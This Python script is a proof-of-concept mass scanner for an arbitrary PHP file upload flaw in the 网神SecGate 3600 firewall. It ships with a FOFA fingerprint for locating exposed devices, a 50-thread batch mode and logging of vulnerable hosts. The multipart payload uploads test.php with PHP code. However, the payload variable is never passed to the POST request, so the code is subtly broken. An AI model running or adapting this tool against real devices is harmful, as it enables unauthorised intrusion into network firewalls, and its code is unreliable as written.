# 网神SecGate 3600防火墙obj_app_upfile任意文件上传漏洞 
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# fid="1Lh1LHi6yfkhiO83I59AYg=="

def banner():
    test = """
██╗    ██╗███████╗      ██╗   ██╗██████╗ ███████╗██╗██╗     ███████╗
██║    ██║██╔════╝      ██║   ██║██╔══██╗██╔════╝██║██║     ██╔════╝
██║ █╗ ██║███████╗█████╗██║   ██║██████╔╝█████╗  ██║██║     █████╗  
██║███╗██║╚════██║╚════╝██║   ██║██╔═══╝ ██╔══╝  ██║██║     ██╔══╝  
╚███╔███╔╝███████║      ╚██████╔╝██║     ██║     ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝       ╚═════╝ ╚═╝     ╚═╝     ╚═╝╚══════╝╚══════╝
                                                                    
                                    author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='网神SecGate 3600防火墙obj_app_upfile任意文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/?g=obj_app_upfile"
    headers = {
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate',
        'Content-Length':'574',
        'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc',
        'User-Agent':'Mozilla/5.0(compatible;MSIE6.0;WindowsNT5.0;Trident/4.0)',     
    }
    data = '------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="upfile"; filename="test.php"\r\nContent-Type: text/plain\r\n\r\n<?php echo 123;?>\r\n\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--'
    
    try:
        response = requests.post(url=target+api_payload,headers=headers,verify=False,timeout=10)
        if response.status_code == 302 and 'successfully' in response.text:
            print(f"[+]{target} 存在文件上传漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")





if __name__ == '__main__':
    main()